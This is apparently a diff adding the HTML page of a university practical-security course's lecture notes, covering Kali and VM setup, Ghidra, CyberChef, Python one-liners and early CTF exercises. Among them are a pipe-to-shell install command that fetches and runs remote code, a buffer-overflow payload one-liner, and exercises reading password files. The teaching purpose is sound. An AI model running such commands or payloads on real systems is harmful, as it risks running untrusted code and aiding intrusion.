@@ -1,0 +1,1260 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>PracSec@RHIT</title>
+        <meta name="robots" content="noindex">
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+        <!-- MathJax -->
+        <script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">PracSec@RHIT</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="welcome-to-csse14x-practical-security"><a class="header" href="#welcome-to-csse14x-practical-security">Welcome to CSSE14x: Practical Security</a></h1>
+<img src="pracSecCat.png" alt="Course Banner Image">
+<h3 id="lecture-notes-of-dave-henthorn-rose-hulman-institute-of-technology"><a class="header" href="#lecture-notes-of-dave-henthorn-rose-hulman-institute-of-technology">Lecture notes of Dave Henthorn, Rose-Hulman Institute of Technology</a></h3>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ctf-tools"><a class="header" href="#ctf-tools">CTF Tools</a></h1>
+<p>Over the next few pages we will take a look at the tools we will use in this course.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="virtual-machines"><a class="header" href="#virtual-machines">Virtual Machines</a></h1>
+<p>Many of us run our CTF/penetration testing tools inside a <em>virtual</em> machine instead of on our desktop.</p>
+<p>This helps because we can:</p>
+<ul>
+<li>keep our own machines free of extraneous tools</li>
+<li>protect our machines from software of unknown origin</li>
+<li>run tools that are not native to our default OS</li>
+</ul>
+<p>Before you can run a virtual machine (the guest), you need to set up the host machine as a hypervisor.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="hypervisors"><a class="header" href="#hypervisors">Hypervisors</a></h1>
+<p>Hypervisors are the software piece that manage virtual machines and allow them access to your hardware. The most common hypervisors for penetration testing or CTF competitions are:</p>
+<ul>
+<li>VMware</li>
+<li>VirtualBox</li>
+<li>Hyper-V</li>
+<li>KVM / QEMU</li>
+</ul>
+<p>I find hypervisors to be a matter of personal preference -- each has a set of pros/cons. Some thoughts:</p>
+<h2 id="vmware"><a class="header" href="#vmware">VMware:</a></h2>
+<ul>
+<li>The flagship VMware hypervisors are run on the largest servers in the world and are hugely expensive and immensely capable. The company provides some of this functionality in desktop versions, VMware Player (Intel/AMD) and VMware Fusion (Mac). While these cost money, they provide them free for non-commercial and academic use. These are my personal choice. High quality networking options, display tuning, snapshots, etc. Fusion (Mac) can be found <a href="https://www.vmware.com/products/fusion/fusion-evaluation.html">here</a> while Player (Intel/AMD) is <a href="https://www.vmware.com/content/vmware/vmware-published-sites/us/products/workstation-player/workstation-player-evaluation.html.html">here</a>.</li>
+</ul>
+<h2 id="virtualbox"><a class="header" href="#virtualbox">VirtualBox</a></h2>
+<ul>
+<li>Available <a href="https://www.virtualbox.org/">here</a> Sort of the opposite of VMware... much of it is open source (GPLv2 license) and free. Very popular for hackers because of this. I wish it had better documentation and advanced networking support, but you can't beat the price.</li>
+</ul>
+<h2 id="hyper-v"><a class="header" href="#hyper-v">Hyper-V</a></h2>
+<ul>
+<li>Developed by Microsoft and available as a built-in service in many versions of Windows, this is an easy one to use for many people. Growing in popularity every year. Learn how to enable Hyper-V <a href="https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v">here</a>. With some configuration tweaks you can use Enhanced Session Mode which enables a better graphical experience along with a working clipboard, complete with file transfer.</li>
+</ul>
+<h2 id="kvmqemu"><a class="header" href="#kvmqemu">KVM/QEMU</a></h2>
+<ul>
+<li>Great choice if you are on a Linux distro. Instructions for enabling on Debian distros <a href="https://wiki.debian.org/KVM">here</a>.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="vm-snapshots"><a class="header" href="#vm-snapshots">VM Snapshots</a></h1>
+<p>One of the coolest features of VMs is the ability to take "snapshots". You are, in essence, saving the state of a VM at that instant in time. You can then roll back changes to a previous known state whenever needed.</p>
+<p>For CTF competitions, a workflow I see quite a bit is:</p>
+<ol>
+<li>Create a VM and tweak with all the tools you will need.</li>
+<li>Snapshot the VM.</li>
+<li>Start a challenge. This may require you to install new software, add new packages to Python, add temporary entries to /etc/hosts, download binaries for reverse engineering, etc.</li>
+<li>Complete the challenge.</li>
+<li>Rollback the VM to the pre-challenge snapshot. On to the next challenge!</li>
+</ol>
+<p>On Hyper-V, snapshots are known as <strong>Checkpoints</strong>.</p>
+<p>On Hyper-V Manager, right click your VM and select Checkpoint.
+<img src="tools/checkpoint.png" alt="Checkpointing Image" /></p>
+<p>You will thank yourself later if you rename the checkpoint to something more descriptive.</p>
+<p><img src="tools/checkpoint2.png" alt="Checkpointing Image" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="creating-a-shared-file-space-between-your-host-and-guest-vm"><a class="header" href="#creating-a-shared-file-space-between-your-host-and-guest-vm">Creating a shared file space between your host and guest (VM).</a></h1>
+<h2 id="warning-one-of-the-main-reasons-we-run-vms-is-to-create-isolation-between-our-work-machine-and-potentially-malicious-code-think-hard-about-the-implications-of-allowing-a-guest-vm-access-to-some-of-your-files"><a class="header" href="#warning-one-of-the-main-reasons-we-run-vms-is-to-create-isolation-between-our-work-machine-and-potentially-malicious-code-think-hard-about-the-implications-of-allowing-a-guest-vm-access-to-some-of-your-files">Warning: One of the main reasons we run VMs is to create isolation between our work machine and potentially malicious code. Think hard about the implications of allowing a guest VM access to some of your files.</a></h2>
+<p>To create a shared file space between your host and VM, you can use the Settings area of VMware Player and select "Shared Folders".</p>
+<p><img src="tools/vmware-shared.png" alt="image that shows vmware shared folder settings" /></p>
+<p>On your Kali VM, complete the following:</p>
+<pre><code>sudo mkdir /mnt/shared
+</code></pre>
+<pre><code>sudo /usr/bin/vmhgfs-fuse .host:/shared /mnt/shared -o subtype=vmhgfs-fuse,allow_other
+</code></pre>
+<p>Tweak the line above if you named your share something other than <code>shared</code>. A shared file space is now available at /mnt/shared on your VM.</p>
+<p>On Windows:</p>
+<p><img src="tools/vmshared-win.png" alt="Windows file explorer screenshot" /></p>
+<p>On Kali:</p>
+<p><img src="tools/vmshared-kali.png" alt="Windows file explorer screenshot" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="kali-linux"><a class="header" href="#kali-linux">Kali Linux</a></h1>
+<p>The most famous distribution of Linux used by hackers worldwide. The main website is <a href="https://www.kali.org/">here</a>.</p>
+<p>Note that Kali is based on Debian Linux, so you can find tips on setup, package management, etc. by searching for Kali, Debian, or even Ubuntu.</p>
+<p>From the Kali website:</p>
+<p><code>The Kali Linux distribution is based on Debian Testing. Therefore, most of the Kali packages are imported, as-is, from the Debian repositories. In some cases, newer packages may be imported from Debian Unstable or Debian Experimental, either to improve user experience, or to incorporate needed bug fixes.</code></p>
+<p>I prefer create a VM from scratch using an ISO from <a href="https://www.kali.org/get-kali/#kali-installer-images">here</a>.</p>
+<p>If you have a working hypervisor and are on PC, you can also grab a pre-built VM image from <a href="https://www.kali.org/get-kali/#kali-virtual-machines">here</a></p>
+<p>As of August 2023, the most recent version is 2023.3</p>
+<p><img src="tools/banner-2023.3-release.jpg" alt="Kali Linux release banner" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="installing-kali-linux-on-hyper-v"><a class="header" href="#installing-kali-linux-on-hyper-v">Installing Kali Linux on Hyper-V</a></h1>
+<p>For this class I would like us to use Hyper-V as our hypervisor of choice. We will be working with the following:</p>
+<ul>
+<li>Kali under Hyper-V with Enhanced Session Mode</li>
+<li>Windows Dev images for some proof-of-concept work. Info <a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">here.</a></li>
+<li>Windows Sandbox mode <a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-overview">Link to Sandbox mode.</a></li>
+</ul>
+<p>Contact me if you are planning to use a Mac or Linux laptop for this course.</p>
+<p>Ready to install Kali on Hyper-V? Follow these instructions:</p>
+<ol>
+<li>Enable Hyper-V if you haven't already. Instructions are <a href="https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v">here</a>.</li>
+<li>Enable Enhanced Session Mode in Hyper-V. Follow <a href="https://learn.microsoft.com/en-us/windows-server/virtualization/hyper-v/learn-more/use-local-resources-on-hyper-v-virtual-machine-with-vmconnect">this guide</a> for instructions.</li>
+<li>Download an installation ISO (not pre-built VM) from <a href="https://www.kali.org/get-kali/#kali-installer-images">here</a>.</li>
+<li>Set up a Hyper-V VM for a Kali install. Check out this guide <a href="https://www.kali.org/docs/virtualization/install-hyper-v-guest-vm/">here</a>.</li>
+<li>Install Kali into the new VM. Instructions <a href="https://www.kali.org/docs/installation/hard-disk-install/">here</a>.</li>
+<li>Follow <a href="https://www.kali.org/docs/virtualization/install-hyper-v-guest-enhanced-session-mode/">these instructions</a> on how to make Enhanced Session Mode active. This will allow you to use the clipboard effectively.</li>
+<li>Use your newly found Copy/Paste abilities to transfer a new desktop wallpaper to your Kali instance, for example from <a href="https://github.com/dorianpro/kali-linux-wallpapers">here</a>.</li>
+</ol>
+<p>At this point, you should have Kali in a beautifully rendered screen with a functioning clipboard.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="kali-tweaks"><a class="header" href="#kali-tweaks">kali-tweaks</a></h1>
+<p>Be sure to check out the <code>kali-tweaks</code> command. You will find some nice customization options here.</p>
+<p><img src="tools/kali-tweaks.png" alt="kali-tweaks menu" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ssh-into-kali"><a class="header" href="#ssh-into-kali">SSH into Kali</a></h1>
+<p>Since many of the tools you will use on Kali are command line, you don't always need to use the graphical user interface. Sometimes it's easiest to use a terminal and SSH into your Kali instance.</p>
+<p>Out of the box, SSH connections to your Kali box are disabled. To enable them, complete the following on your VM:</p>
+<p>Install the OpenSSH server.</p>
+<pre><code>sudo apt install openssh-server
+</code></pre>
+<p>Enable the SSH service.</p>
+<pre><code>sudo systemctl enable ssh.service 
+</code></pre>
+<p>Now start the SSH service.</p>
+<pre><code>sudo systemctl start ssh.service
+</code></pre>
+<p>Finally, record the IP address of your box -- usually located at eth0 for a VM with one network interface.</p>
+<pre><code>ip a
+</code></pre>
+<p><img src="tools/ipaddr.png" alt="image" /></p>
+<p>In the above case, the address of your VM is <code>192.168.46.91</code> and your username is <code>kali</code>.</p>
+<p>You should be able to log in from your desktop now using:</p>
+<pre><code>ssh kali@192.168.46.9
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="creating-a-quick-windows-machine-for-analysis-work"><a class="header" href="#creating-a-quick-windows-machine-for-analysis-work">Creating a quick Windows Machine for Analysis Work</a></h1>
+<p>Sometimes you need to create a quick Windows VM for analysis work. Here's one way:</p>
+<p>In Hyper-V, select <strong>Quick Create</strong> from the <strong>Actions</strong> panel.</p>
+<p><img src="tools/winbox.png" alt="Hyper-V " /></p>
+<p>Then select the <strong>Windows 11 dev environment</strong>. This will create a Windows VM that is ready to go. The best part? All of the Windows stuff (Xbox Live, OneDrive, etc.) that requires you to sign in with an account has been disabled.</p>
+<p><img src="tools/winbox2.png" alt="Hyper-V " /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="build-tools-and-gdb"><a class="header" href="#build-tools-and-gdb">Build Tools and GDB</a></h1>
+<p>After creating your Kali Linux VM you should consider installing the common build tools:</p>
+<p><code>sudo apt install build-essential</code></p>
+<p>This should install gcc, g++, make, and several others.</p>
+<p>To add support for 32-bit binaries, which are still common in CTFs, do the following:</p>
+<p><code>sudo apt install gcc-multilib g++-multilib</code></p>
+<p>Finally, install the GNU Project Debugger, gdb:</p>
+<p><code>sudo apt install gdb</code></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ghidra"><a class="header" href="#ghidra">Ghidra</a></h1>
+<p>Ghidra is an open source tool from the National Security Agency (yes, that NSA!) that we use for reverse engineering.</p>
+<p>Ghidra is a Java app, so you need a working JDK before you can run it.</p>
+<ol>
+<li>
+<p>On a Linux machine, you can check your Java version with:</p>
+<pre><code>java -version
+</code></pre>
+</li>
+<li>
+<p>Look for the version output, something like:
+<code>openjdk version "17.0.8" 2023-07-18</code>
+Be sure that you have version 17 or higher.</p>
+</li>
+<li>
+<p>If you need to install Java, you can use the following command on Kali Linux.</p>
+<pre><code>sudo apt install default-jdk
+</code></pre>
+</li>
+<li>
+<p>After you <a href="https://ghidra-sre.org/">download Ghidra</a>, there isn't a traditional installer. Instead, do the following:</p>
+<ul>
+<li>
+<p>Unzip the file. In the unzipped archive, you will find a script to start Ghidra.</p>
+<ul>
+<li>On UNIX-like systems, run the file</li>
+</ul>
+<pre><code>./ghidraRun
+</code></pre>
+<ul>
+<li>On Windows, run the file:</li>
+</ul>
+<pre><code>ghidraRun.bat
+</code></pre>
+</li>
+</ul>
+</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ghidra-not-working"><a class="header" href="#ghidra-not-working">Ghidra not working?</a></h1>
+<p>If you find that parts of Ghidra are not working out of the box on your Kali instance (especially Kali on ARM), try the following:</p>
+<ol>
+<li>
+<p>Install sdkman</p>
+<pre><code>sudo curl -s "https://get.sdkman.io" | bash
+</code></pre>
+</li>
+<li>
+<p>Restart your terminal shell.</p>
+</li>
+<li>
+<p>Install gradle</p>
+<pre><code>sdk install gradle
+</code></pre>
+</li>
+<li>
+<p>cd into your Ghidra directory.</p>
+</li>
+<li>
+<p>cd into the <code>support</code> directory.</p>
+</li>
+<li>
+<p>Run</p>
+<pre><code>./buildNatives
+</code></pre>
+</li>
+<li>
+<p>Now try Ghidra.</p>
+</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="cyberchef"><a class="header" href="#cyberchef">Cyberchef</a></h1>
+<p>Cyberchef is a tool put out by the GCHQ which is "the UK's intelligence, security and cyber agency". It's a web-app that aims to be your go-to tool for hacking data manipulation.</p>
+<p>You can find it on the web <a href="https://gchq.github.io/CyberChef/">here</a> or inside many infosec packages like Security Onion.</p>
+<p><img src="tools/cyberchef1.png" alt="Starting image of Cyberchef" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="cyberchef-example"><a class="header" href="#cyberchef-example">Cyberchef Example</a></h1>
+<p>Here's an example:</p>
+<p><img src="tools/cyberchef1.png" alt="beginning screen of cyberchef" /></p>
+<p>On the left you will find a palette with all the different operations possible. You will drag those onto the <strong>Recipe</strong> panel and that will operate on the <strong>Input</strong>, producing your <strong>Output</strong>.</p>
+<p>For example, let's say we have the bytes:</p>
+<pre><code>\x43\x79\x62\x65\x72\x63\x68\x65\x66\x20\x69\x73\x20\x61\x77\x65\x73\x6f\x6d\x65
+</code></pre>
+<p>Go ahead and copy those bytes into the <strong>Input</strong> panel of Cyberchef.</p>
+<p><img src="tools/cyberchef2.png" alt="input section of cyberchef" /></p>
+<p>Now go over to the left-most palette and search for <strong>hex</strong> since these look like hexadecimal bytes.</p>
+<p>Select <strong>From Hex</strong> and drag it on to the <strong>Recipe</strong> panel.</p>
+<p><img src="tools/cyberchef3.png" alt="recipe section of cyberchef" /></p>
+<p>This was a super easy one to solve.</p>
+<p><img src="tools/cyberchef4.png" alt="cyberchef" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="building-recipes-in-cyberchef"><a class="header" href="#building-recipes-in-cyberchef">Building recipes in Cyberchef</a></h1>
+<p>Let's say we find the following message when reverse engineering a binary.</p>
+<pre><code>ttmq3a2X8YKp2qmDp8Kr2avPu4O9wrOCqcyqzraSqJCR45zsk8qK7urJqQ==
+</code></pre>
+<p>We know from inspecting the executable there is an XOR binary operation to obfuscate the text. But our keen eyes notice this is a Base64 encoded string.</p>
+<p>Build a recipe that:</p>
+<ol>
+<li>Decodes the Base64 encoded string.</li>
+<li>Decrypts that string using XOR decryption. Unfortunately we only know that the key used for encryption is 2 bytes in size. You will need to brute force it. HINT: We believe it is an <code>http</code> string.</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="python"><a class="header" href="#python">Python</a></h1>
+<p>Python is a great tool for ethical hacking! It's ubiquitous, easy to work with, and you can write up a script quickly.</p>
+<p>Check out the next few sections for interesting things you can do with Python.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="interactive-python"><a class="header" href="#interactive-python">Interactive Python</a></h1>
+<p>While many courses teach you to write Python scripts, don't forget that you can work with Python in an interactive manner. This can be done on the command line or through what is called an interactive Python notebook (.ipynb file extension).</p>
+<p>My preferred method for quick work in Python is <a href="https://colab.research.google.com">Google Colab</a>, which is free with a Google account.</p>
+<p>Open a <em>New notebook</em> from the <strong>File</strong> menu:</p>
+<p><img src="Python/welcomecolab.png" alt="Google Colab example image" /></p>
+<p>There's nothing to configure or do... just start typing your code in the code block.</p>
+<p><img src="Python/colab1.png" alt="Google Colab example image" /></p>
+<p>And then click the play button to execute that code block. A green checkmark shows that it executed properly.</p>
+<p><img src="Python/colab2.png" alt="Google Colab example image" /></p>
+<p>On the left side, you will see a toolbar. If you select the {x} button it will pull up the <em>Variable inspector</em> and you can see defined variables and their values.</p>
+<p><img src="Python/colab3.png" alt="Google Colab example image" /></p>
+<p><strong>IMPORTANT</strong> This is Python running in the cloud. When you are done with this instance it will be wiped and given to someone else. As such, be sure to save your data. Your work, however, is continuously being saved by Colab. If you look at the <em>File</em> menu, you will also see options for saving your notebook in Google Drive or Github, or you can download it to your host.</p>
+<p>You can pull files into your Python script from your Google drive or, more easily, by clicking on the folder icon on the left. Use the upload button or simply drag files into this mini file manager.</p>
+<p><img src="Python/colabfiles1.png" alt="Google Colab example image" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="extending-colab"><a class="header" href="#extending-colab">Extending Colab</a></h1>
+<p>Let's say I want to use a library that is not pre-installed on Colab. For example, I want to use the pwntools library to help with a binary CTF challenge. But I run into this issue when I try the import:</p>
+<p><img src="Python/colabimportfail.png" alt="colab failed import" /></p>
+<p>You can install pip packages by using the following command:</p>
+<pre><code>!pip install -q package_name
+</code></pre>
+<p>where the -q option means a quiet install.</p>
+<p>And there we go! Package is now installed and my Colab instance is that much more powerful!</p>
+<p><img src="Python/colabimportfail2.png" alt="colab failed import" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="single-line-python-scripts"><a class="header" href="#single-line-python-scripts">Single Line Python Scripts</a></h1>
+<p>Did you know you can run single line Python scripts from the command line using the -c argument?</p>
+<p>Try the following:</p>
+<pre><code>python -c "print('A'*46)"
+</code></pre>
+<p>Output</p>
+<pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre>
+<p>Single line program to create 46 A characters. But why?</p>
+<p>When we get around to creating buffer overflows, keep this tool in mind. We often need to create a long string that fills up a buffer and then injects characters beyond it.</p>
+<p>For example, I could fill up the buffer with a 46 'A' characters and then start injecting additional hex characters I want using this simple command line:</p>
+<pre><code>python -c "print('A'*46 + '\xd0\x8f\x04\x08')"
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ultra-simple-web-file-sharing-using-python"><a class="header" href="#ultra-simple-web-file-sharing-using-python">Ultra simple web file sharing using Python</a></h1>
+<p>Need to share files quickly? Python has your back.</p>
+<p>Navigate to the folder where your file, called <code>filename</code> is located. Note the IP address of the computer and then run:</p>
+<pre><code>python -m http.server 9999
+</code></pre>
+<p>This will create an http instance at port 9999 capable of serving files located in that directory.</p>
+<p>From a different machine, connect to it through a browser or simply use wget.</p>
+<pre><code>wget x.x.x.x:9999/filename
+</code></pre>
+<p>where x.x.x.x is the IP address of your HTTP server.</p>
+<p>Note: This is an unencrypted HTTP stream. Be cognizant of the files you transfer over this stream as they will be readily visible.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="vpns"><a class="header" href="#vpns">VPNs</a></h1>
+<p>Let's lay out the following scenario:</p>
+<p>You have been given permission to assess a specific asset for vulnerabilities, and this asset is connected to the internet. You scan the asset for open ports and find a web server running on port 80. You fire up <a href="https://github.com/OJ/gobuster">gobuster</a> to identify potential endpoints on the website.</p>
+<p><em>WARNING: Network traffic of this sort is associated with threat actors. There is a real possibility that your employer or ISP will flag your activities as malicious and take action.</em></p>
+<p>To remedy this, most CTF labs and cyber ranges will house their vulnerable assets on internal, protected networks. Your network traffic is tunneled through a Virtual Private Network (VPN) while traversing the open internet, only emerging on that protected network. Not only are the vulnerable assets protected, your malicious looking traffic is obscured from the public internet.</p>
+<p>In Kali Linux, you can establish VPN connections at the top right corner of the screen.</p>
+<p><img src="tools/kalivpn.png" alt="Image of VPN connection in Kali Linux" /></p>
+<p>You will need the VPN information (host name, port, etc.) from the lab manager. This may come in the form of a file that you import.</p>
+<p><em>WARNING: Most VPNs of this sort are classified as SPLIT TUNNEL networks. Only traffic destined for the private network is tunneled. <strong>All other traffic is sent normally.</strong> Be sure that activities like port scanning, vulnerability scanning, endpoint enumeration, etc. are done only on assets that are part of the private network.</em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="welcome-to-csse140-practical-security-i"><a class="header" href="#welcome-to-csse140-practical-security-i">Welcome to CSSE140: Practical Security I</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="welcome-to-csse141-practical-security-ii"><a class="header" href="#welcome-to-csse141-practical-security-ii">Welcome to CSSE141: Practical Security II</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="welcome-to-csse141"><a class="header" href="#welcome-to-csse141">Welcome to CSSE141</a></h1>
+<h2 id="intro-to-practical-security-ii"><a class="header" href="#intro-to-practical-security-ii">Intro to Practical Security II</a></h2>
+<p>Objectives for today's class:</p>
+<ul>
+<li>Welcome and introductions</li>
+<li>Let's solve some CTF challenges together</li>
+<li>Time to install Kali Linux</li>
+</ul>
+<p>Homework:</p>
+<ul>
+<li>Complete the challenges listed on Moodle</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="practical-security-week-2"><a class="header" href="#practical-security-week-2">Practical Security Week 2</a></h1>
+<h2 id="intro-to-practical-security-ii-1"><a class="header" href="#intro-to-practical-security-ii-1">Intro to Practical Security II</a></h2>
+<p>Let's try some stuff with Kali!</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="practicing-wget-and-using-tar"><a class="header" href="#practicing-wget-and-using-tar">Practicing wget and using tar</a></h1>
+<p>There's a file to get into your Kali</p>
+<pre><code>wget http://classes.csse.rose-hulman.edu/csse14x/shadow.tar.gz
+</code></pre>
+<p>Untar and unzip it</p>
+<pre><code>tar -xzvf shadow.tar.gz
+</code></pre>
+<p>This should create an <code>etc</code> directory.</p>
+<p>Looking in there I see a file, <code>shadow</code>. What is it?</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="passwords-in-unix-and-linux"><a class="header" href="#passwords-in-unix-and-linux">Passwords in UNIX and Linux</a></h1>
+<p>UNIX and UNIX-like OS's (Linux, etc.) used to store passwords in the file <code>/etc/passwd</code> . They no longer do this, instead saving the passwords in <code>/etc/shadow</code></p>
+<ul>
+<li>What's the reason for this?</li>
+</ul>
+<p>Have the students do</p>
+<pre><code>cat /etc/passwd
+</code></pre>
+<p>What does this stuff mean?</p>
+<p>Try the following:</p>
+<pre><code>sudo adduser csse141
+</code></pre>
+<p>Walk them through <code>adduser</code>, being sure to add some fun user info like <code>Olin 157</code> as their room.</p>
+<p>Then</p>
+<pre><code>cat /etc/passwd
+</code></pre>
+<p>The last line should have the new info for the just-added user.</p>
